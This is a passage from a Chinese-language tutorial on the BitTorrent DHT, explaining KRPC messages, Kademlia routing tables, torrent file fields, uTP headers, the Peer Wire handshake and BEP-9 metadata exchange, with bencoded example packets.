一个字典类型包含了请求所附加的参数(info_hash/id..)\n    2) r 表示回复(回复 Responses): 包含了返回的值。发送回复消息是在正确解析了请求消息的基础上完成的，包含了一个附加的关键字 r。关键字 r 是字典类型\n        2.1) id: peer节点id号或者下一跳DHT节点\n                2.2) nodes\": \"\" \n                2.3) token: token\n    3) e 表示错误(错误 Errors): 包含一个附加的关键字 e，关键字 e 是列表类型\n        3.1) 第一个元素是数字类型，表明了错误码，当一个请求不能解析或出错时，错误包将被发送。下表描述了可能出现的错误码\n        201: 一般错误\n        202: 服务错误\n        203: 协议错误，比如不规范的包，无效的参数，或者错误的 toke\n        204: 未知方法 \n        3.2) 第二个元素是字符串类型，表明了错误信息\n```\n\n以上是整个KRPC的协议框架结构，具体到请求Query/回复Response/错误Error还有具体的协议实现\n\n\n### 0x2: 请求Query具体协议\n\n所有的请求都包含一个关键字 id，它包含了请求节点的节点 ID。所有的回复也包含关键字id，它包含了回复节点的节点 ID\n\n\n+ <font color=\"red\"> ping: 检测节点是否可达，请求包含一个参数id，代表该节点的nodeID。对应的回复也应该包含回复者的nodeID </font>\n\n```\nping Query = {\"t\":\"aa\", \"y\":\"q\", \"q\":\"ping\", \"a\":{\"id\":\"abcdefghij0123456789\"}}\nbencoded = d1:ad2:id20:abcdefghij0123456789e1:q4:ping1:t2:aa1:y1:qe\n\t\nResponse = {\"t\":\"aa\", \"y\":\"r\", \"r\": {\"id\":\"mnopqrstuvwxyz123456\"}}\nbencoded = d1:rd2:id20:mnopqrstuvwxyz123456e1:t2:aa1:y1:re\n```\n\n+ <font color=\"red\"> find_node: find_node 被用来查找给定 ID 的DHT节点的联系信息，该请求包含两个参数id(代表该节点的nodeID)和target。回复中应该包含被请求节点的路由表中距离target最接近的K个nodeID以及对应的nodeINFO</font>\n\t\n```\nfind_node Query = {\"t\":\"aa\", \"y\":\"q\", \"q\":\"find_node\", \"a\": {\"id\":\"abcdefghij0123456789\", \"target\":\"mnopqrstuvwxyz123456\"}}\n# \"id\" containing the node ID of the querying node, and \"target\" containing the ID of the node sought by the queryer. \nbencoded = d1:ad2:id20:abcdefghij01234567896:target20:mnopqrstuvwxyz123456e1:q9:find_node1:t2:aa1:y1:qe\n\t\nResponse = {\"t\":\"aa\", \"y\":\"r\", \"r\": {\"id\":\"0123456789abcdefghij\", \"nodes\": \"def456...\"}}\nbencoded = d1:rd2:id20:0123456789abcdefghij5:nodes9:def456...e1:t2:aa1:y1:re\n```\n\nfind_node 请求包含 2 个参数，第一个参数是 id，包含了请求节点的ID。第二个参数是 target，包含了请求者正在查找的节点的ID\n\t\n当一个节点接收到了 find_node 的请求，他应该给出对应的回复，回复中包含 2 个关键字 id(被请求节点的id) 和 nodes，nodes 是字符串类型，包含了被请求节点的路由表中最接近目标节点的 K(8) 个最接近的节点的联系信息(被请求方每次都统一返回最靠近目标节点的节点列表K捅)\n\t\n```\n参数: {\"id\" : \"<querying nodes id>\", \"target\" : \"<id of target node>\"}\n回复: {\"id\" : \"<queried nodes id>\", \"nodes\" : \"<compact node info>\"}\n```\n\n这里要明确3个概念:\n\t\n1. 请求方的id: 发起这个DHT节点寻址的节点自身的ID，可以类比DNS查询中的客户端\n2. 目标target id: 需要查询的目标ID号，可以类比于DNS查询中的URL，这个ID在整个递归查询中是一直不变的\n3. 被请求节点的id: 在节点的递归查询中，请求方由远及近不断询问整个链路上的节点，沿途的每个节点在返回时都要带上自己的id号\n\n\t\n+ <font color=\"red\"> get_peers: 获取 infohash 的 peers</font>\n\n\n1. get_peers 请求包含 2 个参数(id请求节点ID，info_hash代表torrent文件的infohash，infohash为种子文件的SHA1哈希值，也就是磁力链接的btih值)\n\n2. response get_peer: \n\n\t1) 如果被请求的节点有对应 info_hash 的 peers，他将返回一个关键字 values，这是一个列表类型的字符串。每一个字符串包含了 \"CompactIP-address/portinfo\" 格式的 peers 信息(即对应的机器ip/port信息)(peer的info信息和DHT节点的info信息是一样的)\n\n\t2) 如果被请求的节点没有这个 infohash 的 peers，那么他将返回关键字 nodes(需要注意的是，如果该节点没有对应的infohash信息，而只是返回了nodes，则请求方会认为该节点是一个\"可疑节点\"，则会从自己的路由表K捅中删除该节点)，这个关键字包含了被请求节点的路由表中离 info_hash 最近的 K 个节点(我这里没有该节点，去别的节点试试运气)，使用 \"Compactnodeinfo\" 格式回复。在这两种情况下，关键字 token 都将被返回。token 关键字在今后的 annouce_peer 请求中必须要携带。token 是一个短的二进制字符串\n\n\t\n```\n参数: {\"id\" : \"<querying nodes id>\", \"info_hash\" : \"<20-byte infohash of target torrent>\"}\n\t\n回复: \n{\"id\" : \"<queried nodes id>\", \"token\" :\"<opaque write token>\", \"values\" : [\"<peer 1 info string>\", \"<peer 2 info string>\"]}\n或: \t\n{\"id\" : \"<queried nodes id>\", \"token\" :\"<opaque write token>\", \"nodes\" : \"<compact node info>\"}\n```\n\n+ <font color=\"red\"> announce_peer: 这个请求用来表明发出 announce_peer 请求的节点，正在某个端口下载 torrent 文件</font>\n\nannounce_peer 包含 4 个参数\n\t\n```\n1. 第一个参数是 id: 包含了请求节点的 ID\n2. 第二个参数是 info_hash: 包含了 torrent 文件的 infohash\n3. 第三个参数是 port: 包含了整型的端口号，表明 peer 在哪个端口下载\n4. 第四个参数数是 token: 这是在之前的 get_peers 请求中收到的回复中包含的。收到 announce_peer 请求的节点必须检查这个 token 与之前我们回复给这个节点 get_peers 的 token 是否相同(也就说，所有下载者/发布者都要参与检测新加入的发布者是否伪造了该资源，但是这个机制有一个问题，如果最开始的那个发布者就伪造，则整条链路都是一个伪造的错的资源infohash信息了)\n如果相同，那么被请求的节点将记录发送 announce_peer 节点的 IP 和请求中包含的 port 端口号在 peer 联系信息中对应的 infohash 下，这意味着一个一个事实: 当前这个资源有一个新的peer提供者了，下一次有其他节点希望或者这个资源的时候，会把这个新的(前一次请求下载资源的节点)也当作一个peer返回给请求者，这样，资源的提供者就越来越多，资源共享速度就越来越快\n```\n\n一个peer正在下载某个资源，意味着该peer有能够访问到该资源的渠道，且该peer本地是有这份资源的全部或部分拷贝的，它需要向DHT网络广播announce消息，告诉其他节点这个资源的下载地址\n\t\n```\narguments:  {\"id\" : \"<querying nodes id>\",\n\"implied_port\": <0 or 1>,\n\"info_hash\" : \"<20-byte infohash of target torrent>\",\n\"port\" : <port number>,\n\"token\" : \"<opaque token>\"}\n\t\nresponse: {\"id\" : \"<queried nodes id>\"}\n```\n\n报文包例子 Example Packets \n\t\n```\nannounce_peers Query = {\"t\":\"aa\", \"y\":\"q\", \"q\":\"announce_peer\", \"a\": {\"id\":\"abcdefghij0123456789\", \"implied_port\": 1, \"info_hash\":\"mnopqrstuvwxyz123456\", \"port\": 6881, \"token\": \"aoeusnth\"}}\nbencoded = d1:ad2:id20:abcdefghij01234567899:info_hash20:<br />\nmnopqrstuvwxyz1234564:porti6881e5:token8:aoeusnthe1:q13:announce_peer1:t2:aa1:y1:qe\n\t\nResponse = {\"t\":\"aa\", \"y\":\"r\", \"r\": {\"id\":\"mnopqrstuvwxyz123456\"}}\nbencoded = d1:rd2:id20:mnopqrstuvwxyz123456e1:t2:aa1:y1:re\n```\n\n### 0x3: 回复 Responses\n\n回复 Responses的包已经在上面的Query里说明了\n\n\n### 0x4: 错误 Errors\n\n错误包例子 Example Error Packets\n\n```\ngeneric error = {\"t\":\"aa\", \"y\":\"e\", \"e\":[201, \"A Generic Error Ocurred\"]}\nbencoded = d1:eli201e23:A Generic Error Ocurrede1:t2:aa1:y1:ee\n```\n\n\n# 3. BitTorrent协议\n\nBitTorrent 使用\"分布式哈希表\"(DHT)来为无 tracker 的种子(torrents)存储 peer 之间的联系信息。这样每个 peer 都成了 tracker。这个协议基于 Kademila 网络并且在 UDP 上实现\n\n\n```\n1. \"peer\" 是在一个 TCP 端口上监听的客户端/服务器，它实现了 BitTorrent 协议 \n2. \"节点\" 是在一个 UDP 端口上监听的客户端/服务器，它实现了 DHT(分布式哈希表) 协议 \nDHT 由节点组成，它存储了 peer 的位置。BitTorrent 客户端包含一个 DHT 节点，这个节点用来联系 DHT 中其他节点，从而得到 peer 的位置，进而通过 BitTorrent 协议下载 \n```\n\n\n每个节点有一个全局唯一的标识符，作为 \"node ID\"。节点 ID 是一个随机选择的 160bit(20字节) 空间，BitTorrent infohash 也使用这样的 160bit 空间。\"距离\"用来比较两个节点 ID 之间或者节点 ID 和 infohash 之间的\"远近\"(节点和节点、节点和文件之间的距离)。节点必须维护一个路由表，路由表中含有一部分其它节点的联系信息。其它节点距离自己越近时，路由表信息越详细。因此每个节点都知道 DHT 中离自己很\"近\"的节点的联系信息，而离自己非常远的 ID 的联系信息却知道的很少 \n在 Kademlia 网络中，距离是通过异或(XOR)计算的，结果为无符号整数。distance(A, B) = |A xor B|，值越小表示越近\n\n\n\n1. 当节点要为 torrent(种子文件) 寻找 peer(保存了目标资源的IP) 时，它将自己路由表中的节点 ID 和 torrent 的 infohash(资源HASH) 进行\"距离对比\"(节点和目标文件的距离)，然后向路由表中离 infohash 最近的节点发送请求，问它们正在下载这个 torrent 的 peer 的联系信息\n\n2. 因为资源HASH和节点HASH都共用一套20bytes的命名空间，所以DHT节点充当了peer节点的\"代理\"的工作，我们不能直接向peer节点发起资源获取请求(即使这个peer节点确实存储了我们的目标资源)，因为peer节点本身不具备处理P2P request/response能力的，我们需要借助DHT的能力，让DHT告诉我们哪个peer节点保存了我们想要的资源或者哪个DHT节点可能知道从而递归地继续去问那个DHT网络\n\n3. 如果一个被联系的节点知道下载这个 torrent 的 peer 信息，那个 peer 的联系信息将被回复给当前节点。否则，那个被联系的节点则必须回复在它的路由表中离该 torrent 的 infohash 最近的节点的联系信息，(`get_peers`)\n\n4. 最初的节点重复地请求比目标 infohash 更近的节点，直到不能再找到更近的节点为止\n\n5. 查询完了之后，客户端把自己作为一个 peer 插入到所有回复节点中离种子最近的那个节点中，这一步背后的含义是: 我之前是请求这个资源的人，我们现在获取到资源了，我在下载这个文件的同时，我也要充当一个新的peer来向其他的客户端贡献自己的文件共享，这样，当另外的其他客户端在发起新的请求的时候，DHT节点就有可能把当前客户端对应的peer返回给新的请求方，这样不断发展下去，这个资源的热度就越来越热，下载速度也越来越快(`announce_peer`)\n\n6. 请求 peer 的返回值包含一个不透明的值，称之为\"令牌(token)\"\n\n7. 如果一个节点宣布它所控制的 peer 正在下载一个种子(即该节点拥有该文件资源)，它必须在回复请求节点的同时，附加上对方向我们发送的最近的\"令牌(token)\"。这样当一个节点试图\"宣布\"正在下载一个种子时，被请求的节点核对令牌和发出请求的节点的 IP 地址。这是为了防止恶意的主机登记其它主机的种子。由于令牌仅仅由请求节点返回给收到令牌的同一个节点，所以没有规定他的具体实现。但是令牌必须在一个规定的时间内被接受，超时后令牌则失效。在 BitTorrent 的实现中，token 是在 IP 地址后面连接一个 secret(通常是一个随机数)，这个 secret 每五分钟改变一次，其中 token 在十分钟以内是可接受的\n\n\n这种握手验证的原理是:\n\n> 请求方生成一个随机值，跟着我的请求发给被请求方，被请求方回复的时候要带上这个随机值，那请求方就知道，你是我刚才想请求的那个人\n\n### 0x1: 路由表 Routing Table\n\n\n1. 每个节点维护一个路由表保存已知的好节点。路由表中的节点是用来作为在 DHT 中请求的起始点。路由表中的节点是在不断的向其他节点请求过程中，对方节点回复的。即DHT中的K桶中的节点，当我们请求一个目标资源的时候，我们根据HASH XOR从自己的K桶中选择最有可能知道该资源的节点发起请求，而被请求的节点也不一定知道目标资源所在的peer，这个时候被请求方会返回一个新的\"它认为可能知道这个peer的节点\"，请求方收到这个新的节点后，会把这个节点保存进自己的K桶内，然后继续发起请求，直到找到目标资源所在的peer为止\n\n2. 并不是我们在请求过程中收到的节点都是平等的，有的节点是好的，而另一些则不是。许多使用 DHT 协议的节点都可以发送请求并接收回复，但是不能主动回复其他节点的请求，这种节点被称之为\"坏节点\"\n\n3. 节点的路由表只包含已知的好节点，这很重要。好节点是指在过去的 15 分钟以内，曾经对我们的某一个请求给出过回复的节点(存活好节点)，或者曾经对我们的请求给出过一个回复(不用在15分钟以内)，并且在过去的 15 分钟给我们发送过请求。上述两种情况都可将节点视为好节点。在 15 分钟之后，对方没有上述 2种情况发生，这个节点将变为可疑的。当节点不能给我们的一系列请求给出回复时，这个节点将变为坏的。相比那些未知状态的节点，已知的好节点会被给于更高的优先级。(看源码确实是这样的)\n\n\t> 这就反过来告诉我们，如果我们要做DHT嗅探，我们的嗅探器除了要能够发出FIND_NODE请求及接收返回之外，还需要能够响应其他节点发来的请求(`get_peers/announce_peer`)，这样才不会被其他节点列入\"可疑\"甚至\"坏节点\"列表中\n\n4. 路由表覆盖从 0 到 2^160 全部的节点 ID 空间。路由表又被划分为桶(bucket)，每个桶包含一部分的 ID 空间。空的路由表只有一个桶，它的 ID 范围从 min=0 到 max=2^160。当 ID 为 N 的节点插入到表中时，它将被放到 ID 范围在 min <= N < max 的 桶 中\n\n5. 空的路由表只有一个桶，所以所有的节点都将被放到这个桶中。每个桶最多只能保存 K 个节点，当前 K=8。当一个桶放满了好节点之后，将不再允许新的节点加入，除非我们自身的节点 ID 在这个桶的范围内。在这样的情况下，这个桶将被分裂为 2 个新的桶，每个新桶的范围都是原来旧桶的一半。原来旧桶中的节点将被重新分配到这两个新的桶中。如果一个新表只有一个桶，这个包含整个范围的桶将总被分裂为 2 个新的桶，每个桶的覆盖范围从 0..2^159 和 2^159..2^160  以log2N的方式不断分裂，类似于Kademlia中的K桶机制\n\n6. 当桶装满了好节点，新的节点会被丢弃。一旦桶中的某个节点变为了坏的节点，那么我们就用新的节点来替换这个坏的节点。如果桶中有在 15 分钟内都没有活跃过的节点，我们将这样的节点视为可疑的节点，这时我们向最久没有联系的节点发送 ping。如果被 ping 的节点给出了回复，那么我们向下一个可疑的节点发送 ping，不断这样循环下去，直到有某一个节点没有给出 ping 的回复，或者当前桶中的所有节点都是好的(也就是所有节点都不是可疑节点，他们在过去 15 分钟内都有活动)。如果桶中的某个节点没有对我们的 ping 给出回复，我们最好再试一次(再发送一次 ping，因为这个节点也许仍然是活跃的，但由于网络拥塞，所以发生了丢包现象，注意 DHT 的包都是 UDP 的)，而不是立即丢弃这个节点或者直接用新节点来替代它。这样，我们得路由表将充满稳定的长时间在线的节点 \n\n7. 每个桶都应该维持一个 lastchange 字段来表明桶中节点的\"新鲜\"度。当桶中的节点被 ping 并给出了回复，或者一个节点被加入到了桶，或者一个节点被新的节点所替代，桶的 lastchange 字段都应当被更新。如果一个桶的 lastchange 在过去的 15 分钟内都没有变化，那么我们将更新它。这个更新桶操作是这样完成的\n\n\t+ 从这个桶所覆盖的范围中随机选择一个 ID，并对这个 ID 执行 find_nodes 查找操作。\n\t+ 常常收到请求的节点通常不需要常常更新自己的桶, 反之，不常常收到请求的节点常常需要周期性的执行更新所有桶的操作，这样才能保证当我们用到 DHT 的时候，里面有足够多的好的节点 \n\n8. 在插入第一个节点到路由表并启动服务后，这个节点应试着查找 DHT 中离自己更近的节点，这个查找工作是通过不断的发出 find_node 消息给越来越近的节点来完成的，当不能找到更近的节点时，这个扩散工作就结束了\n\n9. 路由表应当被启动工作和客户端软件保存(也就是启动的时候从客户端中读取路由表信息，结束的时候客户端软件记录到文件中)\n\n\n### 0x2: BitTorrent 协议扩展 BitTorrent Protocol Extension\n\n\nBitTorrent 协议已经被扩展为可以在通过 tracker 得到的 peer 之间互相交换节点的 UDP 端口号(也就是告诉对方我们的 DHT 服务端口号)，在这样的方式下，客户端可以通过下载普通的种子文件来自动扩展 DHT 路由表(我直接知道某个节点有某一个资源)。新安装的客户端第一次试着下载一个无 tracker 的种子时，它的路由表中将没有任何节点，这是它需要在 torrent 文件中找到联系信息\n\n\n1. peers 如果支持 DHT 协议就将 BitTorrent 协议握手消息的保留位的第 8 字节的最后一位置为 1\n2. 这时如果 peer 收到一个 handshake 表明对方支持 DHT 协议，就应该发送 PORT 消息。它由字节 0x09 开始，payload 的长度是 2 个字节，包含了这个 peer 的 DHT 服务使用的网络字节序的 UDP 端口号\n3. 当 peer 收到这样的消息时应当向对方的 IP 和消息中指定的端口号的节点发送 ping\n4. 如果收到了 ping 的回复，那么应当使用上述的方法将新节点的联系信息加入到路由表中 \n\n### 0x3: Torrent 文件扩展 Torrent File Extensions(种子文件)\n\n一个无 tracker 的 torrent 文件字典不包含 announce 关键字，而使用 nodes 关键字来替代。这个关键字对应的内容应该设置为 torrent 创建者的路由表中 K 个最接近的节点(可供选择的)，这个关键字也可以设置为一个已知的可用节点(这意味着接收到这个种子文件的客户端能够向这些节点发出解析请求，询问资源的所在位置)，比如这个 torrent 文件的创建者.\n\n请不要自动加入 router.bittorrent.com 到 torrent 文件中或者自动加入这个节点到客户端路由表中。这里可以仔细思考一下，这么做还有另一个好处，这个对等网络可以保持无中心化，对于外部新加入的新节点来说，它可以不用通过\"中心引导节点\"来加入网络，隐藏了\"中心引导节点\"的存在，增强了对等网络的隐蔽性\n\n\nbt 种子文件是使用 bencode 编码的，整个文件就 dictionary，包含以下键\n\n```\n1. info(dictinary): 必选, 表示该bt种子文件的文件信息 \n    1) 文件信息包括文件的公共部分\n        1.1) piece length(integer): 必选, 每一数据块的长度\n        1.2) pieces(string): 必选, 所有数据块的 SHA1 校验值\n        1.3) publisher(string):    可选, 发布者\n        1.4) publisher.utf-8(string): 可选, 发布者的 UTF-8 编码\n        1.5) publisher-url(string): 可选, 发布者的 URL\n        1.6) publisher-url.utf-8(string): 可选, 发布者的 URL 的 UTF-8 编码\n    2) 如果 bt 种子包含的是单个文件，包含以下内容\n        2.1) name(string): 必选, 推荐的文件名称\n        2.2) name.utf-8(string): 可选, 推荐的文件名称的 UTF-8 编码\n        2.3) length(int): 必选，文件的长度单位是字节\n    3) 如果是多文件，则包含以下部分:\n        3.1) name(string): 必选, 推荐的文件夹名称\n        3.2) name.utf-8(string): 可选, 推荐的文件名称的 UTF-8 编码\n        3.3) files(list): 必选, 文件列表，每个文件列表下面是包括每一个文件的信息，文件信息是个字典 \n    4) 文件字典\n        4.1) length(int): 必选，文件的长度单位是字节\n        4.2) path(string): 必选，文件名称，包含文件夹在内\n        4.3) path.utf-8(string): 必选，文件名称 UTF-8 表示，包含文件夹在内\n        4.4) filehas(string): 可选，文件hash\n        4.5) ed2k(string): 可选, ed2k 信息 \n\n2. announce(string): 必选, tracker 服务器的地址\n3. announce-list(list): 可选, 可选的 tracker 服务器地址\n4. creation date(interger): 必选, 文件创建时间\n5. comment(string): 可选, bt 文件注释\n6. created by(string): 可选，文件创建者\n```\n\n<font color=\"red\">pieces是一个字符串，它的长度是20的倍数，每一段20个字符表示对应文件块的sha1 hash值。</font>\n\n\n\n\n这里要特别注意一点：磁力链接的infohash也是根据info字段来计算的，info字段的pieces为每个数据块的校验值，其作用是验证下载下来的文件是否正确，如果下载下来的文件块计算出来的SHA1值和pieces中的SHA1校验值不一致，该数据块要重新下载。 所以，我们可以看出根据磁力链接下载文件是分成两个步骤的\n\n1. 先根据infohash下载种子文件的info字段，种子文件并不是必须的，但是info字段却必不可少\n2. 然后根据infohash下载源文件，将下载的每一个数据块和info中的对应的SHA1校验码进行比较，不一致重新下载该数据块\n\n需要注意的是\n\n1. 一般的种子文件会包含announce，也就是tracker服务器的地址(trackerless是BTTorrent的趋势)\n2. 如果没有tracker服务器，文件中可能会包含nodes，nodes是存有种子信息的peer节点，这样的种子文件就是trackerless torrent。如果有nodes客户端直接从nodes获取种子信息\n3. <font color=\"red\">而从DHT网络中下载下来的种子文件既没有annouce也没有nodes，客户端只能通过info字段计算出hashinfo，再从bootstrap node节点开始在DHT网络中寻找种子信息</font>\n\n\nBT原生依靠Tracker，后来才加入dht\n\n\n# 4. uTP协议 \n\nuTP协议是一个基于UDP的开放的BT点对点文件共享协议。在uTP协议出现之前，BT下载会占用网络中大量的链接，直接导致其它网络应用服务质量下载和网络的拥堵，因此有很多ISP都开始限制BT的下载。uTP减轻了网络延迟并解决了传统的基于TCP的BT协议所遇到的拥塞控制问题，提供可靠的有序的传送。一个有效的uTP数据包包含下面格式的报头\n\n![1](Kademlia_DHT_KRPC_BitTorrent协议/2.png)\n\n\n1. type(包类型):\n\n\t```\n    1) ST_DATA = 0: 最重要的数据包，uTP就是使用该类型的包传送数据\n    2) ST_FIN = 1: 关闭连接，这是uTP连接的最后一个包，类似于TCP中的FIN\n    3) ST_STATE = 2: 简单的应答包，表明已从对方收到了数据包，该包不包含任何数据，seq_nr值不变\n    4) ST_RESET = 3: 终止连接，类似于TCP中的RST\n    5) ST_SYN = 4: 初始化连接，类似于TCP中的SYN，这是uTP连接的第一个包\n\t```\n2. ver: This is the protocol version. The current version is 1.\n3. extension: The type of the first extension in a linked list of extension headers. \n  \n    ```\n    1) 0 means no extension.\n    2) Selective acks: There is currently one extension:\n\t```\n\n4. `connection_id`: This is a random, unique, number identifying all the packets that belong to the same connection. Each socket has one connection ID for sending packets and a different connection ID for receiving packets. The endpoint initiating the connection decides which ID to use, and the return path has the same ID + 1.    \n\n\tuTP的一个很重要的特点是使用connection id来标识一次连接，而不是每个包算一次连接。所以在分析ST_DATA时，需要注意找所有connection id相同的数据包，然后按seq_nr排序，seq_nr应该是依次递增的(注意ST_STATE包不会增加seq_nr值)，如果发现两个ST_DATA的seq_nr值相同则说明后面那个报文是重复报文需要忽略掉，如果发现两个ST_DATA的seq_nr值不是连续的，中间差了一个或多个，则可能是由于网络原因发生了丢包现象，数据包将不可用\n\n5. `timestamp_microseconds`: This is the 'microseconds' parts of the timestamp of when this packet was sent. This is set using gettimeofday() on posix and QueryPerformanceTimer() on windows. The higher resolution this timestamp has, the better. The closer to the actual transmit time it is set, the better.\n\n6. `timestamp_difference_microseconds`: This is the difference between the local time and the timestamp in the last received packet, at the time the last packet was received. This is the latest one-way delay measurement of the link from the remote peer to the local machine. \nWhen a socket is newly opened and doesn't have any delay samples yet, this must be set to 0.\n\n7. wnd_size: Advertised receive window. This is 32 bits wide and specified in bytes. The window size is the number of bytes currently in-flight, i.e. sent but not acked. The advertised receive window lets the other end cap the window size if it cannot receive any faster, if its receive buffer is filling up. When sending packets, this should be set to the number of bytes left in the socket's receive buffer.\n\n8. seq_nr\n9. ack_nr\n\n在uTP连接建立之后，就开始传送需要的数据了。peer和peer之间传送数据也是遵循着一定的规范，就是Peer Wire协议。\n\n\n# 5. Peer Wire协议 \n\n在BitTorrent中，节点的寻址是通过DHT实现的，而实际的资源共享和传输则需要通过uTP以及Peer Wire协议来配合完成\n\n### 0x1: 握手\n\nPeer Wire协议是Peer之间的通信协议，通常由一个握手消息开始。握手消息的格式是这样的\n\n```\n<pstrlen><pstr><reserved><info_hash><peer_id> \n```\n\n在BitTorrent协议的v1.0版本, pstrlen = 19, pstr = \"BitTorrent protocol\"，info_hash是上文中提到的磁力链接中的btih，peer_id每个客户端都不一样，但是有着一定的规则，根据前面几个字符可以推断出客户端的类型\n\n```\n'AG' - Ares\n'A~' - Ares\n'AR' - Arctic\n'AV' - Avicora\n'AX' - BitPump\n'AZ' - Azureus\n'BB' - BitBuddy\n'BC' - BitComet\n'BF' - Bitflu\n'BG' - BTG (uses Rasterbar libtorrent)\n'BR' - BitRocket\n'BS' - BTSlave\n'BX' - ~Bittorrent X\n'CD' - Enhanced CTorrent\n'CT' - CTorrent\n'DE' - DelugeTorrent\n'DP' - Propagate Data Client\n'EB' - EBit\n'ES' - electric sheep\n'FT' - FoxTorrent\n'FX' - Freebox BitTorrent\n'GS' - GSTorrent\n'HL' - Halite\n'HN' - Hydranode\n'KG' - KGet\n'KT' - KTorrent\n'LH' - LH-ABC\n'LP' - Lphant\n'LT' - libtorrent\n'lt' - libTorrent\n'LW' - LimeWire\n'MO' - MonoTorrent\n'MP' - MooPolice\n'MR' - Miro\n'MT' - MoonlightTorrent\n'NX' - Net Transport\n'PD' - Pando\n'qB' - qBittorrent\n'QD' - QQDownload\n'QT' - Qt 4 Torrent example\n'RT' - Retriever\n'S~' - Shareaza alpha/beta\n'SB' - ~Swiftbit\n'SS' - SwarmScope\n'ST' - SymTorrent\n'st' - sharktorrent\n'SZ' - Shareaza\n'TN' - TorrentDotNET\n'TR' - Transmission\n'TS' - Torrentstorm\n'TT' - TuoTu\n'UL' - uLeecher!\n'UT' - µTorrent\n'VG' - Vagaa\n'WD' - WebTorrent Desktop\n'WT' - BitLet\n'WW' - WebTorrent\n'WY' - FireTorrent\n'XL' - Xunlei\n'XT' - XanTorrent\n'XX' - Xtorrent\n'ZT' - ZipTorrent\n```\n\nPeer Wire协议是在uTP协议基础上里层应用态协议。收到握手消息后，对方也会回复一个握手消息，并且开始协商一些基本的信息。\n\n\n# 6. BitTorrent协议扩展ut_metadata和ut_pex(Extension for Peers to Send Metadata Files) (磁力链接核心)\n\n```\nBEP:9 \t\tTitle:\tExtension for Peers to Send Metadata Files\nBEP:10 \t\tTitle:\tExtension Protocol\n```\n\n\n借助于DHT/KRPC完成了的Node节点寻址，资源对应的Peer获取，以及uTP以及Peer Wire完成握手之后，接下要就要\"动真格\"了，我们需要获取到目标资源的\"种子信息(infohash/filename/pieces分块sha1)\"了，<font color=\"red\">这个扩展的目的是为了在最初没有.torrent文件的情况仍然能够加入swarm并能够完成下载。这个扩展能让客户端从peer哪里下载metadata。这让支持magnet link成为了可能，magnet link是一个web页上的链接，仅仅包含了足够加入swarm的足够信息(info hash)</font>\n\n\n### 0x1: Metadata\n\n这个扩展仅仅传输.torrent文件的info-字典字段，这个部分可以由infohash来验证。在这篇文档中，.torrent的这个部分被称为metadata。\n\nMetadata被分块，每个块有16KB(16384字节)，Metadata块从0开始索引，所有快的大小都是16KB，除了最后一个块可能比16KB小\n\n\n### 0x2: Extension头部\n\nMetadata扩展使用extension协议(<font color=\"green\">__BEP0010__</font>)来声称它的存在。它在extension握手消息的头部m字典加入ut_metadata项。它标识了这个消息可以使用这个消息码，同时也可以在握手消息中加入metadata_size这个整型字段(不是在m字典中)来指定metadata的字节数\n\n```\n{'m': {'ut_metadata', 3}, 'metadata_size': 31235}\n```\n\n### 0x3: Extension消息\n\nExtension消息都是bencode编码，这里有3类不同的消息\n\n\n+ request 0: \n\n请求消息并不在字典中附加任何关键字，这个消息的回复应当来自支持这个扩展的peer，是一个reject或者data消息，回复必须和请求所指出的片相同\nPeer必须保证它所发送的每个片都通过了infohash的检测。即直到peer获得了整个metadata并通过了infohash的验证，才能够发送片(即一个peer应该保证自己已经完整从其他peer中拷贝了一份相同的资源文件后，才能继续响应其他节点的拷贝请求)。Peers没有获得整个metadata时，对收到的所有metadata请求都必须直接回复reject消息\n\n```\n{'msg_type': 0, 'piece': 0}\nd8:msg_typei0e5:piecei0ee\n# 这代表请求消息在请求metadata的第一片\n```\n\n+ data 1\n\n这个data消息需要在字典中添加一个新的字段，\"total_size\".这个关键字段和extension头的\"metadata_size\"有相同的含义，这是一个整型\n\nMetadata片被添加到bencode字典后面，他不是字典的一部分，但是是消息的一部分(必须包括长度前缀)。\n如果这个片是metadata的最后一个片，他可能小于16KB。如果它不是metadata的最后一片，那大小必须是16KB\n\n```\n{'msg_type': 1, 'piece': 0, 'total_size': 3425}\nd8:msg_typei1e5:piecei0e10:total_sizei34256eexxxxxxxx...\n# x表示二进制数据(metadata) \n```\n\n+ reject 2\n\nReject消息没有附件的关键字。它的意思是peer没有请求的这个metadata片信息 \n\n在客户端收到收到一定数目的消息后，可以通过拒绝请求消息来进行洪泛攻击保护。尤其在metadata的数目乘上一个因子时 \n\n```\n{'msg_type': 2, 'piece': 0}\nd8:msg_typei1e5:piecei0ee\n```\n\n### 0x4: request消息: Metadat信息获取过程\n\n+ 扩展支持交互(互相询问对方支持哪些扩展)\n\n根据BEP-010我们知道，扩展消息一般在Peer Wire握手之后立即发出，是一个B编码的字典\n\n```\n{\n    e: 0,\n    ipv4: xxx,\n    ipv6: xxx,\n    complete_ago: 1,\n    m:\n    {\n        upload_only: 3,\n        lt_donthave: 7,\n        ut_holepunch: 4,\n        ut_metadata: 2,\n        ut_pex: 1,\n        ut_comment: 6\n    },\n    matadata_size: 45377,\n    p: 33733,\n    reqq: 255,\n    v: BitTorrent 7.9.3\n    yp: 19616,\n    yourip: xxx\n}\n\n1. m: 是一个字典，表示客户端支持的所有扩展以及每个扩展的编号\n    1) ut_pex: 表示该客户端支持PEX(Peer Exchange)\n    2) ut_metadata表示支持BEP-009(也就是交换种子文件的metadata)\n```\n\n+ 握手handshake\n\n\n我们在完成双方握手之后，并且得到了对方支持的扩展信息。资源请求方也通知被请求方本机支持的扩展情况，然后后面接着一个扩展消息(从上面的m字典可以看到可能会有多种不同的扩展消息)，具体是哪个类型的扩展消息由message ID后面那个数字决定，这个数字对应着m字典中的编号。譬如我们这里的消息是\n\n```\n00 00 00 1b 14 02 ... 00 00 00 1b \n1. 消息长度为 0x1b (27 bytes) \n2. 14 表示是 扩展消息(0x14 = 20)\n3. 02 对应上面m字典中的 ut_metadata，所以我们这个消息是ut_metadata消息\n```\n\n\n再次看上图的截图，我们这里的图显示的是[msg_type: 0, piece: 2]正是request消息，意思是向对象请求第二个piece的数据，piece的意思是分块的意思，根据BEP-009我们知道，种子文件的metadata（也就是info部分）会按16KB分成若干块，除最后一块每一块的大小都是16KB，每一块从0开始按顺序进行编号。所以这个请求的意思就是向对象请求第三块的metadata\n\n\n\n+ 回复data信息\n\n\n从图中形象的表示可以看到torrent文件整个info的长度为45377，这个值正是上面握手报文后的扩展消息中的metadata_size的值。在发送request消息之后，接下来对方应该回复data消息（如果对方有数据）或reject消息（如果对方没有数据）。\n\n\nmsg_type为1表示是回复就是我所需要的数据，但是注意这里的数据并没完，由于uTP协议的缘故，我们可以根据connection id找到这个连接后续的所有数据。 这里其实一共收到了三个消息，我们分别来看一下\n\n```\n00 00 00 03 09 83 c5 --> message 